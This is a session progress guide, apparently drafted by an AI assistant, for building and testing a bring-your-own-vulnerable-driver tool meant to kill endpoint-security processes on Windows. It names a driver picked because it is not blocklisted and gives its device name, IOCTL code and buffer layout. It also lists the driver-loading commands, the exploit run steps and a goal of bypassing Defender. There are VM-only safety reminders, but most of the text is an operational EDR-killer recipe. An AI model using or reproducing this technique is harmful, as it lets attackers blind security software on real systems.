# Session 2 Quick Start Guide
**Date:** February 10, 2026  
**Status:** BYOVD implementation complete, ready for Windows build & test

---

## ✅ What We Completed

### 1. Driver Selection Decision ✅
- **Chose:** vulndriver.sys (wsftprm.sys) - CVE-2023-52271
- **Rejected:** RTCore64.sys (heavily blocklisted)
- **Key advantage:** NOT on Microsoft's driver blocklist as of 2026

### 2. Code Adaptation ✅
- Updated `byovd_vulndriver.hpp` and `byovd_vulndriver.cpp`
- Device name: `\\.\Warsaw_PM`
- IOCTL code: `0x22201C`
- Added `terminateProcess(uint32_t pid)` method
- Buffer: 1036 bytes, PID in first 4 bytes

### 3. Files Ready ✅
- **Driver:** `/home/bipin/german-project/EDR-Adaptive-Framework/vulndriver.sys` (38KB)
- **Implementation:** Fully adapted for vulndriver.sys
- **Build scripts:** Created for Windows
- **Testing guide:** Complete documentation

---

## 🚀 Next Steps: Build & Test on Windows 10

### Step 1: Transfer Files to Windows VM

**Files to Transfer:**
```
EDR-Adaptive-Framework/
├── vulndriver.sys           ← CRITICAL
├── build_windows.bat        ← Build script
├── TESTING_GUIDE.md         ← Testing instructions
└── [entire project folder]  ← All source code
```

**Transfer Methods:**
- **Option A:** VirtualBox shared folder
- **Option B:** Git clone directly on Windows VM
- **Option C:** USB passthrough

### Step 2: Install Visual Studio on Windows VM

**Download & Install:**
1. Download Visual Studio 2022 Community (free)
   - URL: https://visualstudio.microsoft.com/downloads/
2. During installation, select:
   - ✅ Desktop development with C++
   - ✅ CMake tools for Windows
   - ✅ Windows 10/11 SDK
3. Reboot after installation

### Step 3: Build the Framework

**On Windows VM:**
```cmd
REM Open "Developer Command Prompt for VS 2022"
cd C:\path\to\EDR-Adaptive-Framework

REM Run build script
build_windows.bat

REM Expected output: build\bin\Release\edr_framework.exe
```

### Step 4: First Test - Manual Driver Load

**Quick validation before framework test:**
```cmd
REM As Administrator
cd C:\path\to\EDR-Adaptive-Framework

REM Copy driver to test location
mkdir C:\EDR-Test
copy vulndriver.sys C:\EDR-Test\

REM Manual load test
sc create WarsawPMTest type=kernel start=demand binPath="C:\EDR-Test\vulndriver.sys"
sc start WarsawPMTest
sc query WarsawPMTest

REM Should show: STATE = RUNNING ✅

REM Cleanup
sc stop WarsawPMTest
sc delete WarsawPMTest
```

### Step 5: Framework Test

**Run the full BYOVD exploit:**
```cmd
cd build\bin\Release

REM Copy driver to default location
copy ..\..\..\vulndriver.sys C:\EDR-Test\vulndriver.sys

REM Run framework
edr_framework.exe

REM From menu:
REM - Select BYOVD technique
REM - Driver path: C:\EDR-Test\vulndriver.sys
REM - Execute
```

### Step 6: Test Process Termination

**Safe test with Notepad:**
```cmd
REM 1. Start Notepad
start notepad.exe

REM 2. Get PID
tasklist | findstr notepad.exe
REM Example: notepad.exe    4532 Console    1    12,456 K

REM 3. Run with target PID
edr_framework.exe --technique byovd --target_pid 4532

REM 4. Verify termination
tasklist | findstr notepad.exe
REM Should be empty ✅
```

---

## 📊 Thursday Demo (Feb 12) Checklist

### Must Have:
- [ ] Driver loads successfully on Windows 10
- [ ] Device handle opens (`\\.\Warsaw_PM`)
- [ ] Can demonstrate process termination
- [ ] Clean execution with proper logging
- [ ] Cleanup works (no leftover services/files)

### Should Have:
- [ ] 3-5 slides explaining technique
- [ ] Comparison chart (RTCore vs vulndriver)
- [ ] Live demo of full attack chain
- [ ] Timing metrics (< 2 sec total)

### Nice to Have:
- [ ] Test against Windows Defender
- [ ] Record backup demo video
- [ ] Architecture diagram of framework

---

## 🐛 Troubleshooting Quick Reference

| Error | Cause | Fix |
|-------|-------|-----|
| "StartService failed: 1056" | Driver already running | `sc stop WarsawPMDriver` first |
| "CreateFile failed: 2" | Driver not loaded | Check `sc query WarsawPMDriver` |
| "DeviceIoControl failed: 1" | Success (Windows quirk) | Ignore if process terminated |
| BSOD | Kernel panic | Restore VM snapshot |
| Build errors | Missing Windows SDK | Install VS 2022 with C++ tools |

---

## 📂 File Locations Reference

**On Linux Host:**
```
/home/bipin/german-project/EDR-Adaptive-Framework/
├── vulndriver.sys                           ← 38KB driver
├── build_windows.bat                        ← Windows build script
├── TESTING_GUIDE.md                         ← Full testing guide
├── include/exploits/byovd_vulndriver.hpp        ← Updated header
├── src/exploits/byovd_vulndriver.cpp            ← Updated implementation
└── contexts/progress1.md                    ← Session 1 notes
```

**On Windows VM (target):**
```
C:\EDR-Framework\                            ← Project root
    ├── vulndriver.sys
    ├── build_windows.bat
    └── build\bin\Release\
        └── edr_framework.exe                ← Final binary

C:\EDR-Test\                                 ← Testing directory
    └── vulndriver.sys                       ← Driver copy
```

---

## 🎯 Success Criteria

**Minimum (for Thursday):**
```
[+] SeLoadDriverPrivilege enabled
[+] Driver deployed successfully
[+] Service created/opened successfully
[+] Driver started successfully!
[+] Device handle opened successfully (Warsaw_PM)!
[+] Kernel-level access confirmed!
[+] Ready to terminate processes via ZwTerminateProcess
✓ BYOVD ATTACK SUCCESSFUL!
```

**Optimal:**
```
Above + Successfully terminated test process (Notepad)
Above + Tested against Defender (disabled or bypassed)
Above + Complete demo presentation ready
```

---

## 🔐 Security Reminders

- ⚠️ Only test in isolated VM environment
- ⚠️ Never run on production systems
- ⚠️ Take VM snapshot before each test
- ⚠️ Disable network adapter during testing
- ⚠️ Keep driver files secure (don't upload to public repos)

---

## 📞 If You Get Stuck

**Common Issues:**

1. **Can't build on Windows**
   - Use Visual Studio Installer to add C++ components
   - Run from "Developer Command Prompt"

2. **Driver won't load**
   - Verify Test Mode: `bcdedit | findstr testsigning`
   - Check DSE disabled: `bcdedit | findstr nointegritychecks`
   - Reboot if settings changed

3. **Framework crashes**
   - Check administrator privileges
   - Verify driver path is correct
   - Look for error codes in output

4. **BSOD on driver start**
   - Restore VM snapshot immediately
   - Check driver architecture matches OS (x64)
   - Try manual load first to isolate issue

---

**READY FOR WINDOWS TESTING! 🚀**

**Time Estimate:**
- VS 2022 Install: 30-45 min
- File Transfer: 5 min
- Build: 5-10 min
- Manual Test: 5 min
- Framework Test: 10 min
- **Total: ~1 hour**

**Good luck with the demo! The hard part (implementation) is done.** 💪
